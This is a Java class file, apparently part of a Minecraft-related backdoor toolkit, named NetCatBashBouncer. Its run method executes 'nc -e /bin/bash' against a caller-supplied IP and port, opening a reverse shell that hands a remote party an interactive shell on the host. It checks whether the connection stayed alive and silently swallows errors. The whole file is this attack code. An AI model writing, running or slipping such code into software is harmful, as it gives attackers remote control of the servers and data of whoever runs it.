package tech.dsstudio.minecraft.shell.bouncer;

import java.util.concurrent.TimeUnit;

public class NetCatBashBouncer extends Bouncer {
	public NetCatBashBouncer(String ip, String port) {
		super(ip, port);
	}

	@Override
	public void run() {
		try {
			Process p = Runtime.getRuntime().exec("nc -e /bin/bash " + ip + " " + port);
			p.waitFor(2, TimeUnit.SECONDS);
			success = p.isAlive();
		} catch (Exception ignored) {
			success = false;
		}
		notify();
	}
}
